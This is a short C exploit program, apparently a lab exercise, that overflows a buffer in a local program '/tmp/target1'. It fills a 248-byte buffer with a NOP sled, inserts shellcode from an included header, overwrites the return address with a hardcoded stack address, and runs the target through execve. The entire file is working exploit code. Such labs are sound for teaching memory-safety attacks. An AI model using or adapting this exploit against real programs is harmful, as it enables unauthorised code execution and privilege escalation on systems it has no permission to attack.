#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/target1"

int main(void)
{
  char *args[3];
  char *env[1];
  char buf[248];
  memset(buf, 0x90, 248);

  strncpy(buf+195, shellcode, 45);
  strncpy(buf+244, "\x08\xfd\xff\xbf", 4);
  //strncpy(buf+244, "\x12\x34\x56\x78", 4);
  
  args[0] = TARGET; 
  args[1] = buf;
  args[2] = NULL;
  env[0] = NULL;

  if (0 > execve(TARGET, args, env))
    fprintf(stderr, "execve failed.\n");

  return 0;
}
